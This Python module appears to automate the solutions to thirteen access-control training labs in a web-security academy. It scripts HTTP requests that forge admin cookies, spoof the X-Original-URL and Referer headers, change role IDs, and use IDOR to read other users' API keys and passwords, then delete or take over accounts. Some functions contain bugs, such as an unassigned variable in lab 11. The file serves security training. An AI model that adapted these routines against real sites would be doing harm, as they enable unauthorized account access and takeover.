import modules.MenuOperations as MenuOperations
import modules.VisualEffects as VisualEffects
import modules.RequestOperations as request
import modules.LabOperations as LabOperations
import modules.Variables as Variables
import modules.Texts as Texts
from bs4 import BeautifulSoup
import re


def menu():
    MenuOperations.vulnerability_labs_menu("Access_Control", {
        1: "Unprotected admin functionality",
        2: "UAF with unpredictable Variables.url",
        3: "User role controlled by request parameter",
        4: "User role can be modified in user profile",
        5: "Variables.url-based access control can be circumvented",
        6: "Method-based access control can be circumvented",
        7: "User ID controlled by request parameter",
        8: "User ID controlled by rp, with unpredictable user IDs",
        9: "User ID controlled by rp with data leakage in redirect",
        10: "User ID controlled by rp with password disclosure",
        11: "Insecure direct object references",
        12: "Multi-step process with no access control on one step",
        13: "Referer-based access control"
    })


def solve_lab_1():
    VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 2)
    admin_panel_path = "/administrator-panel"
    admin_panel_url = Variables.url + admin_panel_path
    admin_panel_delete_carlos_url = admin_panel_url + "/delete?username=carlos"
    req = request.session.post(admin_panel_delete_carlos_url, verify=False, proxies=Variables.proxies)
    if req.status_code == 200:
        print("\n[+] Successfully deleted carlos's account.")
    else:
        print("\n[-] carlos's account is not found!")


def solve_lab_2():
    VisualEffects.loading_effect("searching for admin panel...", 1)
    response = request.session.get(Variables.url, verify=False, proxies=Variables.proxies)
    soup = BeautifulSoup(response.text, "lxml")

    admin_panel_tag = soup.find(text=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_panel_tag).group(1)

    VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
    delete_carlos_url = Variables.url + admin_path + "/delete?username=carlos"
    response = request.session.get(delete_carlos_url, verify=False, proxies=Variables.proxies)

    if response.status_code == 200:
        print("[+] Successfully deleted carlos's account!")


def solve_lab_3():
    VisualEffects.loading_effect(Texts.getting_csrf_token_text, 1)
    csrf_token = LabOperations.get_csrf_token()

    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        delete_carlos_url = Variables.url + "/admin/delete?username=carlos"
        VisualEffects.loading_effect("changing cookies...", 1)
        cookies = {"session": "kebap", "Admin": "true"}
        VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
        request.session.get(delete_carlos_url, cookies=cookies, verify=False, proxies=Variables.proxies)


def solve_lab_4():
    data = {"username": "wiener", "password": "peter"}
    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

    if "Your email is: " in response.text:
        change_email_url = Variables.url + "/my-account/change-email"

        VisualEffects.loading_effect("changing \"roleid\" value to \"2\"...", 1)
        data = {"email": "kebap@kebap.kebap", "roleid": 2}
        response = request.session.post(change_email_url, json=data, verify=False, proxies=Variables.proxies)

        if "admin" in response.text:
            VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
            delete_carlos_url = Variables.url + "/admin/delete?username=carlos"
            response = request.session.post(delete_carlos_url, verify=False, proxies=Variables.proxies)

            if response.status_code == 200:
                print("[+] Successfully deleted carlos's account.")


def solve_lab_5():
    VisualEffects.loading_effect("changing header for be able to access admin panel...", 1)
    admin_header = {"X-Original-Variables.url": "/admin/delete"}

    delete_carlos_url = Variables.url + "/?username=carlos"
    VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
    request.session.get(delete_carlos_url, headers=admin_header, verify=False, proxies=Variables.proxies)

    response = request.session.get(Variables.url, verify=False, proxies=Variables.proxies)
    if Texts.lab_solved_text in response.text:
        print(Texts.successfully_deleted_carlos_text)


def solve_lab_6():
    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    login_data = {"username": "wiener", "password": "peter"}
    response = request.session.post(Variables.login_url, data=login_data, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("upgrading wiener's account...", 1)
        upgrade_wiener_url = Variables.url + "/admin-roles?username=wiener&action=upgrade"
        request.session.get(upgrade_wiener_url, verify=False, proxies=Variables.proxies)


def solve_lab_7():
    VisualEffects.loading_effect(Texts.getting_csrf_token_text, 1)
    csrf_token = LabOperations.get_csrf_token()

    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    response = request.session.post(Variables.login_url, data=data_login, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("sending request for carlos's account", 1)
        carlos_url = Variables.url + "/my-account?id=carlos"
        response = request.session.get(carlos_url, verify=False, proxies=Variables.proxies)

        if "carlos" in response.text:
            VisualEffects.loading_effect("getting carlos's api key...", 1)
            api_key = (re.search(Texts.your_api_key_is_text, response.text).group(1)).split("</div>")[0]

            VisualEffects.loading_effect(Texts.submitting_solution_text, 1)
            data = {"answer": f"{api_key}"}
            request.session.post(Variables.submit_solution_url, data=data, verify=False, proxies=Variables.proxies)


def solve_lab_8():
    VisualEffects.loading_effect("searching for carlos's blog posts...", 1)
    response = request.session.get(Variables.url, verify=False, proxies=Variables.proxies)
    post_ids = re.findall(r'postId=(\w+)"', response.text)
    unique_post_ids = list(set(post_ids))

    VisualEffects.loading_effect("retrieving carlos's userId from blog posts...", 1)
    for i in unique_post_ids:
        response = request.session.get(Variables.url + "/post?postId=" + i, verify=False, proxies=Variables.proxies)
        if "carlos" in response.text:
            carlos_id = re.findall(r"userId=(.*)'", response.text)[0]

    VisualEffects.loading_effect("logging into wiener's account...", 1)
    csrf_token = LabOperations.get_csrf_token()
    login_data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    request.session.post(Variables.login_url, data=login_data, verify=False, proxies=Variables.proxies)

    # Due to an issue with the lab we are making the following request
    response = request.session.get(Variables.myaccount_url, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("changing userId parameter to access carlos's account...", 1)
        carlos_account_url = Variables.url + "/my-account?id=" + carlos_id
        response = request.session.get(carlos_account_url, verify=False, proxies=Variables.proxies)

        if "carlos" in response.text:
            VisualEffects.loading_effect("retrieving carlos's api key...", 1)
            api_key = (re.search(Texts.your_api_key_is_text, response.text).group(1)).split("</div>")[0]

            VisualEffects.loading_effect(Texts.submitting_solution_text, 1)
            data = {"answer": f"{api_key}"}
            request.session.post(Variables.submit_solution_url, data=data, verify=False, proxies=Variables.proxies)


def solve_lab_9():
    VisualEffects.loading_effect("logging into wiener user...", 1)
    csrf_token = LabOperations.get_csrf_token()
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    response = request.session.post(Variables.login_url, data=data_login, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("retrieving carlos's api key by changing \"id\" parameter...", 1.5)
        carlos_account_url = Variables.url + "/my-account?id=carlos"
        response = request.session.get(carlos_account_url, allow_redirects=False, verify=False, proxies=Variables.proxies)

        if "carlos" in response.text:
            api_key = (re.search(Texts.your_api_key_is_text, response.text).group(1)).split("</div>")[0]
            data = {"answer": f"{api_key}"}

            VisualEffects.loading_effect(Texts.submitting_solution_text, 1)
            request.session.post(Variables.submit_solution_url, data=data, verify=False, proxies=Variables.proxies)


def solve_lab_10():
    VisualEffects.loading_effect("logging into wiener account...", 1)
    csrf_token = LabOperations.get_csrf_token()
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("accessing administrator account...", 1)
        admin_account_url = Variables.url + "/my-account?id=administrator"
        response = request.session.get(admin_account_url, verify=False, proxies=Variables.proxies)

        if 'administrator' in response.text:
            VisualEffects.loading_effect("getting administrator's password...", 1)
            soup = BeautifulSoup(response.text, 'html.parser')
            password = soup.find("input", {'name': 'password'})['value']

            VisualEffects.loading_effect("logging into administrator's account...", 1)
            csrf_token = LabOperations.get_csrf_token()
            data_login = {"username": "administrator", "password": password, "csrf": csrf_token}
            request.session.post(Variables.login_url, data=data_login, verify=False, proxies=Variables.proxies)

            VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
            delete_carlos_url = Variables.url + "/admin/delete?username=carlos"
            response = request.session.get(delete_carlos_url, verify=False, proxies=Variables.proxies)

    
def solve_lab_11():
    VisualEffects.loading_effect("getting other conversations...", 1)
    chat_url = Variables.url + "/download-transcript/1.txt"
    request.session.get(chat_url, verify=False, proxies=Variables.proxies)

    if 'password' in response.text:
        VisualEffects.loading_effect("searching for carlos's password...", 1)
        carlos_pass = re.findall(r'password is (.*)\.', response.text)

        VisualEffects.loading_effect("logging into carlos's account...", 1)
        csrf_token = LabOperations.get_csrf_token()
        data = {"username": "carlos", "password": carlos_pass, "csrf": csrf_token}
        response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

        if Texts.log_out_text in response.text:
            print("[+] Successfully logged in as the carlos user.")


def solve_lab_12():
    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    data = {'username': 'wiener', 'password': 'peter'}
    response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

    if Texts.log_out_text in response.text:
        VisualEffects.loading_effect("upgrading wiener to administrator...", 1)
        admin_roles_url = Variables.url + "/admin-roles"
        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
        response = request.session.post(admin_roles_url, data=data_upgrade, verify=False, proxies=Variables.proxies)

        if response.status_code == 200:
            print("[+] Successfully upgraded wiener to administrator.")
    

def solve_lab_13():
    VisualEffects.loading_effect(Texts.logging_in_as_wiener_user_text, 1)
    data = {"username": "wiener", "password": "peter"}
    response = request.session.post(Variables.login_url, data=data, verify=False, proxies=Variables.proxies)

    if 'Log out' in response.text:
        VisualEffects.loading_effect("upgrading wiener to administrator...", 1)
        upgrade_url = Variables.url + "/admin-roles?username=wiener&action=upgrade"
        headers = {"Referer": Variables.url + "/admin"}
        response = request.session.get(upgrade_url, headers=headers, verify=False, proxies=Variables.proxies)

        if response.status_code == 200:
            print("[+] Successfully upgraded wiener to administrator.")

    else:
        print("(-) Could not login as the wiener user.")